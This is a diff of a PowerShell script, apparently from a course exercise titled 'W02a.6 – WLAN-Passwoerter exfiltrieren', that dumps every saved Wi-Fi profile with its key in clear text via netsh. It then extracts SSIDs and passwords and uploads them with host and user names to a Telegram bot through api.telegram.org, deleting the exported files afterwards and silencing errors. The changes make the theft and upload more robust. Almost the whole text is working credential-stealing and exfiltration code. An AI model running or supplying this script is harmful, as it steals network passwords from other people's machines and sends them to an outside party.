@@ -1,5 +1,5 @@
 # ============================================================
-#  W02a.6 – WLAN-Passwörter exfiltrieren
+#  W02a.6 - WLAN-Passwoerter exfiltrieren
 #  Autoren: Raphael Bleier, Joachim Lugger
 #  Exfiltration: Telegram Bot
 # ============================================================
@@ -18,42 +18,42 @@ function Send-TgMessage {
 function Send-TgFile {
     param([string]$Filename, [string]$Content, [string]$Caption = "")
     try {
-        $enc      = [System.Text.Encoding]::UTF8
-        $boundary = [System.Guid]::NewGuid().ToString("N")
-        $CRLF     = "`r`n"
-        $header   = $enc.GetBytes(
-            "--$boundary$CRLF" +
-            "Content-Disposition: form-data; name=`"chat_id`"$CRLF$CRLF$CHAT_ID$CRLF" +
-            "--$boundary$CRLF" +
-            "Content-Disposition: form-data; name=`"caption`"$CRLF$CRLF$Caption$CRLF" +
-            "--$boundary$CRLF" +
-            "Content-Disposition: form-data; name=`"document`"; filename=`"$Filename`"$CRLF" +
-            "Content-Type: text/plain; charset=utf-8$CRLF$CRLF"
-        )
-        $body = $header + $enc.GetBytes($Content) + $enc.GetBytes("$CRLF--$boundary--$CRLF")
-        Invoke-RestMethod -Uri "https://api.telegram.org/bot$BOT_TOKEN/sendDocument" `
-            -Method POST `
-            -ContentType "multipart/form-data; boundary=$boundary" `
-            -Body $body | Out-Null
+        Add-Type -AssemblyName System.Net.Http -ErrorAction Stop
+        $http = [System.Net.Http.HttpClient]::new()
+        $form = [System.Net.Http.MultipartFormDataContent]::new()
+        $form.Add([System.Net.Http.StringContent]::new($CHAT_ID),  "chat_id")
+        $form.Add([System.Net.Http.StringContent]::new($Caption),  "caption")
+        $bytes = [System.Text.Encoding]::UTF8.GetBytes($Content)
+        $fc    = [System.Net.Http.ByteArrayContent]::new($bytes)
+        $fc.Headers.Add("Content-Type", "text/plain; charset=utf-8")
+        $form.Add($fc, "document", $Filename)
+        $http.PostAsync("https://api.telegram.org/bot$BOT_TOKEN/sendDocument", $form).GetAwaiter().GetResult() | Out-Null
+        $http.Dispose()
     } catch { }
 }
 
-# ── WLAN-Passwörter sammeln ───────────────────────────────────
+# ── WLAN-Passwoerter sammeln ──────────────────────────────────
 
-Send-TgMessage "🔑 [WIFI GRAB] $env:COMPUTERNAME\$env:USERNAME gestartet"
+Send-TgMessage "[WIFI GRAB] $env:COMPUTERNAME\$env:USERNAME gestartet"
 
-Push-Location $env:TEMP
+# Export explicitly to TEMP so the script works from any working directory (incl. System32)
+$exportFolder = $env:TEMP
+netsh wlan export profile key=clear folder="$exportFolder" | Out-Null
+
 try {
-    netsh wlan export profile key=clear | Out-Null
+    $xmlFiles = Get-ChildItem -Path $exportFolder -Filter "Wi-Fi-*.xml" -ErrorAction SilentlyContinue
 
-    $passwords = Select-String -Path "Wi-Fi-*.xml" -Pattern "<keyMaterial>(.*)</keyMaterial>" |
-                 ForEach-Object {
-                     $ssid = $_.Filename -replace "Wi-Fi-|\.xml", ""
-                     $pass = $_.Matches.Groups[1].Value
-                     "SSID: $ssid  |  Passwort: $pass"
-                 }
-
-    if (-not $passwords) { $passwords = @("(keine WLAN-Profile mit Passwort gefunden)") }
+    if ($xmlFiles) {
+        $passwords = $xmlFiles | ForEach-Object {
+            $xml  = [xml](Get-Content $_.FullName -Raw)
+            $ssid = $xml.WLANProfile.SSIDConfig.SSID.name
+            $pass = $xml.WLANProfile.MSM.security.sharedKey.keyMaterial
+            if ($pass) { "SSID: $ssid  |  Passwort: $pass" }
+            else        { "SSID: $ssid  |  (offen / kein Passwort)" }
+        }
+    } else {
+        $passwords = @("(keine WLAN-Profile mit Passwort gefunden)")
+    }
 
     $report = "=== WIFI PASSWORDS | $(Get-Date -Format 'yyyy-MM-dd HH:mm') ===`n" +
               "Host: $env:COMPUTERNAME | User: $env:USERNAME`n`n" +
@@ -61,8 +61,9 @@ try {
 
     Send-TgFile -Filename "wifi_$(Get-Date -Format 'yyyyMMdd_HHmm').txt" `
                 -Content $report `
-                -Caption "📶 WiFi Passwords – $env:COMPUTERNAME ($($passwords.Count) SSIDs)"
+                -Caption "WiFi Passwords - $env:COMPUTERNAME ($($passwords.Count) SSIDs)"
 } finally {
-    Remove-Item "Wi-Fi-*.xml" -Force -ErrorAction SilentlyContinue
-    Pop-Location
+    # Clean up exported XML files
+    Get-ChildItem -Path $exportFolder -Filter "Wi-Fi-*.xml" -ErrorAction SilentlyContinue |
+        Remove-Item -Force -ErrorAction SilentlyContinue
 }
